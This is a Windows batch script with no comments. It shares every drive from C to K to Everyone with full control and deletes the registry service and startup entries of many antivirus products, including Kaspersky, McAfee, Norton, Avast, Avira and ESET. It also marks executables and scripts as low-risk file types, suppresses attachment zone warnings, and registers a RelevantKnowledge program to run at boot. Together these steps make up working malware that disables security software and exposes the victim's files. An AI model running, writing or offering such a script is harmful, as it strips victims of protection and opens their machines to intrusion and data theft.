@echo off
net share c=c:\ /GRANT:Everyone,FULL
net share d=d:\ /GRANT:Everyone,FULL
net share e=e:\ /GRANT:Everyone,FULL
net share g=g:\ /GRANT:Everyone,FULL
net share f=f:\ /GRANT:Everyone,FULL
net share i=i:\ /GRANT:Everyone,FULL
net share e=e:\ /GRANT:Everyone,FULL
net share h=h:\ /GRANT:Everyone,FULL
net share j=j:\ /GRANT:Everyone,FULL
net share k=k:\ /GRANT:Everyone,FULL
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE2.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\KSDE1.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP18.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP17.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP16.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP15.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP14.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP13.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP12.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP11.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVP10.0.0" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MBAMService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAWFwk" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\MSK80Service" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAPExe" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McBootDelayStartSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mccspsvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfefire" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\HomeNetSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ModuleCoreService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McMPFSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mcpltsvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McProxy" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McODS" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfemms" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McAfee SiteAdvisor Service" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\mfevtp" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\McNaiAnn" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\nanosvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\NortonSecurity" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\!SASCORE" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\SBAMSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVAuxSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ZillyaAVCoreSvc" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\QHActiveDefense" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Antivirus" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\avast! Firewall" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AVG Antivirus" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirMailService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\Avira.ServiceHost" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirWebService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\AntiVirSchedulerService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsservppl" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ProductAgentService" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\vsserv" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\updatesrv" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdAgent" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\cmdvirth" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\DragonUpdater" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\ekrn" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\0247141531883172mcinstcleanup" /f
Reg Delete "HKLM\SYSTEM\CurrentControlSet\services\PEFService" /f
set "osX=%PROCESSOR_ARCHITECTURE%"
if defined PROCESSOR_ARCHITEW6432 set "osX=AMD64"
if "%osX%"=="x86" (
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "24914" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "1" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "2" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t REG_SZ /d "RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t REG_SZ /d "%windir%\system32\rlls.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t REG_SZ /d "%windir%\system32\rlls64.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg64.exe" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlls.dll" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlservice.exe" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t REG_SZ /d "" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge\rlvknlg.exe -boot" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t REG_SZ /d "RelevantKnowledge" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t REG_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t REG_SZ /d "%ProgramFiles%\RelevantKnowledge" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f
) else (
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "24914" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "HideZoneInfoOnProperties" /t REG_DWORD /d "1" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "2" /f /reg:64
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "DisplayName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}" /v "UninstallString" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -bootremove -uninst:RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK_Path" /t REG_SZ /d "%windir%\system32\rlls.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "HK64_Path" /t REG_SZ /d "%windir%\system32\rlls64.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "LD64_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg64.exe" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "KS_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlls.dll" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config" /v "SV_Path" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlservice.exe" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy" /v "" /t REG_SZ /d "" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RunLine" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge\rlvknlg.exe -boot" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "ServiceName" /t REG_SZ /d "RelevantKnowledge" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "UninstURL" /t REG_SZ /d "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600&campaign_id=794" /f /reg:32
Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{d08d9f98-1c78-4704-87e6-368b0023d831}\Config\OSSProxy\Settings" /v "RevertPath" /t REG_SZ /d "%ProgramFiles(x86)%\RelevantKnowledge" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:32
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "QHSafeTray" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Zillya Antivirus" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBAMTray" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SBRegRebootCleaner" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "egui" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IseUI" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "COMODO Internet Security" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ClamWin" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Avira SystrayStartTrigger" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:64
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64
Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64
)